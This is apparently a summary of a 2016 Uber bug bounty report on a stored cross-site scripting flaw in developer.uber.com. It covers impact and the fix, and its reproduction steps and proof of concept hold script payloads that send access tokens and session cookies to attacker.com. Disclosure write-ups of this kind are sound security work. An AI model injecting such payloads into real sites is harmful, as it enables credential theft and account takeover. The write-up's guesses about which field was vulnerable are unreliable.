# Title: Stored XSS on developer.uber.com

- **Platform**: Uber Bug Bounty
- **Program**: Uber
- **Severity**: High
- **Date**: 2016-06-27
- **Researcher**: albinowax
- **Bounty**: $7,500

## Summary

A stored Cross-Site Scripting (XSS) vulnerability on `developer.uber.com` allowed an attacker to inject persistent JavaScript payloads that would execute in the browsers of any developer visiting the affected page, potentially compromising API keys, OAuth tokens, and other developer credentials.

## Technical Details

The vulnerability was discovered on Uber's developer portal (`developer.uber.com`), which hosts API documentation, SDKs, and developer resources. The site had an input field that accepted user-supplied content (likely in app reviews, comments, or issue reports) but failed to properly sanitize HTML/JavaScript before storing and displaying it to other users.

Unlike reflected XSS which requires a victim to click a crafted link, stored XSS is significantly more dangerous because the payload is permanently stored on the server and automatically executed when any user visits the affected page.

## Steps to Reproduce

1. Navigate to `developer.uber.com`
2. Find an input field that stores content and displays it to other users
3. Submit a payload containing malicious JavaScript:
   ```html
   <script>
     fetch('https://attacker.com/steal?token=' + localStorage.getItem('access_token'))
   </script>
   ```
4. The payload is stored on Uber's servers
5. When another developer visits the affected page, the script executes
6. The attacker receives the stolen tokens

## Proof of Concept

```html
<script>
var i = new Image();
i.src = "https://attacker.com/log?cookie=" + encodeURIComponent(document.cookie);
</script>
```

This payload would silently exfiltrate session cookies to the attacker's server.

## Impact

- Theft of developer API keys and OAuth tokens
- Account takeover of developer accounts
- Ability to impersonate legitimate Uber developers
- Access to Uber API usage and app statistics
- Potential to push malicious SDK updates

## Remediation

Uber patched the vulnerability by implementing proper output encoding and input sanitization across the developer portal. They also added Content Security Policy (CSP) headers to mitigate the impact of any future XSS vulnerabilities.

## References
- https://hackerone.com/reports/131450
- https://github.com/ajaysenr/HackerOne-Disclosed-Reports/blob/main/by-program/uber.md
